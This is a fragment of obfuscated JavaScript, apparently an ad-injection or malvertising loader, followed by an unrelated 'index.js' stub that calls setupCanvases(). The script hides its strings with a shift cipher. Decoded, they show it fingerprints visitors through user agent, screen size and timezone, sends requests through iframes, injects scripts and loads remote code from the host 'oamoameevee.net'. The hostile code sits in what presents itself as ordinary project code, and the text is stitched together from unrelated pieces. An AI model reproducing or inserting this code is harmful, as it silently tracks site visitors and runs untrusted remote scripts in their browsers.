z(e,q)},Lj:60,Nj:120,Fj:480,qj:180,Rj:720,mj:"sqfFuyqlazqArreqf",oj:"bab",Tj:"JYXTffbDqcgqef",Pj:"abqz",fj:"azxamp",xk:"eqzp",rk:"fab",Kk:"lazqUp",jk:"radymf",kk:"urdmyq",Mk:"iupft",bk:"abmoufk",Ek:"edo",Yk:"mbbqzpOtuxp",Sk:"omxx",gk:"dqyahqOtuxp",Ck:"B",Gk:"Z",hk:"B/Z",vk:"Z/B",Ok:"B/Z/Z",Wk:"Z/B/Z",ck:"B/Z/B/Z",pk:"Z/Z/Z/Z",Bk:"00",Qk:"000",Vk:"0000",Hk:"00000",nk:"zqie",uk:"bmsqe",zk:"iuwu",ak:"ndaieq",Xk:"huqi",Jk:"yahuq",Uk:"mdfuoxq",dk:"mdfuoxqe",Zk:"efmfuo",ik:"bmsq",wk:"uzpqj",Ik:"iqn",lk:"rxaad",sk:"dqbxmoq",Dk:"tffbe://",Ak:3571,ek:"ep",tk:"sgy",yk:"bwqk",Lk:"befduzs",Nk:"begrrujqe",Fk:"mfan",qk:"DqsQjb",Rk:"pqoapqGDUOaybazqzf",mk:"Ymft",ok:100,Tk:2147483647,Pk:"ebxuf",fk:"puebmfotQhqzf",xM:"sqfFuyq",rM:"eqfDqcgqefTqmpqd",KM:"Otdayq\\/([0-9]{1,})",jM:"OduAE\\/([0-9]{1,})",kM:"Mzpdaup",MM:"Rudqraj",bM:56,EM:"rujqp",YM:"mgfa",SM:"oazfqzf",gM:"//",CM:"/qhqzf",GM:"&",hM:"tffbe:",vM:"eturf",OM:".veaz",WM:"dqcgqefNkUrdmyq",cM:"gdx",pM:"fkbq",BM:"napk",QM:"yqftap",VM:"otmzzqx",HM:"dqcgqef_up",nM:"dqebazeqFkbq",uM:"lazqup_mpnxaow",zM:"eodubf",aM:"rb",XM:"fzqyqxQfzqygoap",JM:"bmdqzfZapq",UM:16807,dM:"mnopqrstuvwxyzabcdefghijkl",ZM:27,iM:"baeufuaz",wM:"xqrf",IM:"dustf",lM:"naffay",sM:"bauzfqdQhqzfe",DM:"uzoxgpqe",AM:".iupsqf-oax-10-eb",eM:"faXaiqdOmeq",tM:"pmfm",yM:"efmdfXampuzs",LM:"uzpqjAr",NM:"pmfmeqf",FM:"oazfqzfIuzpai",qM:"s",RM:"Mphqdf1",mM:"MMN ",oM:" ",TM:"mbbxk",PM:"paogyqzfQxqyqzf",fM:"eqxqofadFqjf",xb:"tdqr",rb:"wqke",Kb:".oee?",jb:".bzs?",kb:"faGbbqdOmeq",Mb:"hqdeuaz",bb:"eagdoqLazqUp",Eb:"paymuz",Yb:"sqzqdmfuazFuyq",Sb:"qjfdm",gb:"|",Cb:"lazqup",Gb:"dqrqddqd",hb:"fuyq_purr",vb:"rmuxqp_gdx",Ob:"rmux_fuyq",Wb:"geqd_up",cb:"ogddqzf_gdx",pb:"xmef_egooqee",Bb:"egooqee_oagzf",Qb:"geqd_msqzf",Vb:"eodqqz_iupft",Hb:"eodqqz_tqustf",nb:"fuyqlazq",ub:"rmuxqp_gdx_paymuz",zb:"dqrqddqd_paymuz",ab:"ogddqzf_gdx_paymuz",Xb:"ndaieqd_xmzs",Jb:"/5/",Ub:"paogyqzf",db:"eqxqofad",Zb:"oazfqzfPaogyqzf",ib:"tqmp",wb:200,Ib:"taef",lb:"efmfge",sb:"omxxeusz",Db:"lazqup_adusuzmx",Ab:"efmdfUzvqofEodubfOapq",eb:"ruzp",tb:"geq-odqpqzfumxe",yb:"xmzsgmsq",Lb:"geqdXmzsgmsq",Nb:"fqjf",Fb:"qddad",qb:"sqfQxqyqzfeNkFmsZmyq",Rb:"eagdeqPuh",mb:"dqxmfuhq",ob:"hmxgq",Tb:"efkxqEtqqfe",Pb:"dqx",fb:"odaeeAdusuz",xE:"uzeqdfNqradq",rE:"iuftOdqpqzfumxe",KE:"bdafafkbq",jE:"%",kE:"rudefOtuxp",ME:2e3,bE:"sqfMxxDqebazeqTqmpqde",EE:"bai",YE:"6g90tD4d4Dd1r8xzjbbl",SE:"bdqhqzfPqrmgxf",gE:"efabUyyqpumfqBdabmsmfuaz",CE:"=",GE:"anvqof",hE:"odqmfqFqjfZapq",vE:"eqfMffdungfq",OE:"pmfm-lazq-up",WE:"pmfm-paymuz",cE:"faUEAEfduzs",pE:"?pahd=fdgq",BE:"efduzsurk",QE:"pdmiUymsq",VE:"fduy",HE:"[\\d\\z]+",nE:"/4/",uE:16,zE:12,aE:"qzpUzvqofEodubfOapq",XE:"nxaow",JE:"omzhme",UE:"sqfOazfqjf",dE:"2p",ZE:"sqfUymsqPmfm",iE:"efmfge_oapq",wE:"puebxmk",IE:30,lE:5e3,sE:"oxaeqp",DE:"f",AE:"baef",eE:"tqmpqde",tE:"qddad.oay",yE:"egnefduzs",LE:"eturfEfduzs ",NE:"ruxx",FE:"pmfq:",qE:32,RE:204,mE:"' ituxq dqcgqefuzs ",oE:": ",TE:"fuyqagf",PE:256,fE:"efmfgeFqjf",xY:"qddad dqcgqef fuyqagf",rY:"qddad '",KY:8,jY:"_",kY:"paogyqzf\\n"}).reduce((e,q)=>(ue.defineProperty(e,q[0],{get:()=>typeof q[1]!="string"?q[1]:q[1].split("").map(i=>{let w=i.charCodeAt(0);return w>=65&&w<=90?v.fromCharCode((w-65+26-12)%26+65):w>=97&&w<=122?v.fromCharCode((w-97+26-12)%26+97):i}).join("")}),e),{}),window,qt,h)});})();</script><script>(function(d,z,s,c){s.src='//'+d+'/400/'+z;s.onerror=s.onload=E;function E(){c&&c();c=null}try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})('oamoameevee.net',8839151,document.createElement('script'),_fzims)




// index.js
// ============================================================================
// ============================================================================

setupCanvases();
